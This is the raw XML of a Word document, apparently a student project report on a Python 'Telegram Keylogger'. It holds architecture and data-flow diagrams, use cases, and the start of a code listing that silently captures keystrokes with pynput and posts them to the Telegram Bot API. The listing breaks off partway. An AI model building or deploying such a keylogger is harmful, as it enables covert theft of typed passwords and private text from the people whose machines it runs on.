    <w:p w14:paraId="0DAF88EA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22242465" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F94F0AF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+       +-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE25A0A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>| Thread Scheduler  |------&gt;| Telegram Bot API  |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A5241F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>| (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>threading.Timer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>) |       | (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>requests.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>)   |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F67A815" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+       +-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A7F9E8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                                    |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652B0FAC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">                                    v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400523E2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">                           +-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203E6C3F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">                           | Telegram Chat     |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CB69E2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">                           | (User receives)   |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A9B109" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">                           +-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F96703" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="4847196C">
          <v:rect id="_x0000_i1389" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F18F2C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.6 Data Flow Diagram (DFD – Level 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0E3D7C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>User Keystrokes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C59A838" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">      |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46975505" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">      v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A57137" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>[Keylogger Script] ---periodically---&gt; [Telegram Bot API] ---&gt; [Telegram Chat Logs]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F52101" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="6AA72AA9">
          <v:rect id="_x0000_i1390" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFFC48E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.7 Use Case Diagram</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08246756" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Actors:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779D0982" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>User/Tester:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Runs and controls the keylogger program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E82B410" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Bot:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Receives logs and displays in chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5742C31F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Use Cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37445906" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Start keylogger.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54181013" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Capture keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2D7B06" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Send logs to Telegram.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD57203" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Stop keylogger with exit command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB102FF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1167AF47" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 4 – Implementation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BBED44" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.1 Overview of Implementation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318A2591" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Keylogger</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is implemented in Python. It uses three major modules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCFF9AE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → to capture keystrokes in real time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AA3F10" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>requests</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → to communicate with the Telegram Bot API.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6241FACA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>threading</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → to schedule periodic reporting of keystrokes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183EF725" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The program runs silently, stores keystrokes in a buffer, and sends them to a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram chat</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> at regular intervals.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429BFF2A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="1F623A8F">
          <v:rect id="_x0000_i1439" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7598B4FD" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.2 Code Listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6439BA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Below is the complete code used in this project:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6607A375" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput.keyboard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E16A854" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>import threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56447CC6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C73A51A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B91A2E0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BOT_TOKEN = 'YOUR_BOT_TOKEN'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D222957" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>CHAT_ID = 'YOUR_CHAT_ID'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6298D0C2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B8DA0BC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>log = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235C023F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BCEFC56" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>send_telegram_message</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB333B9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>f"https</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>://api.telegram.org/bot{BOT_TOKEN}/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>sendMessage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD44128" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">    payload = {</w:t>
      </w:r>
    </w:p>
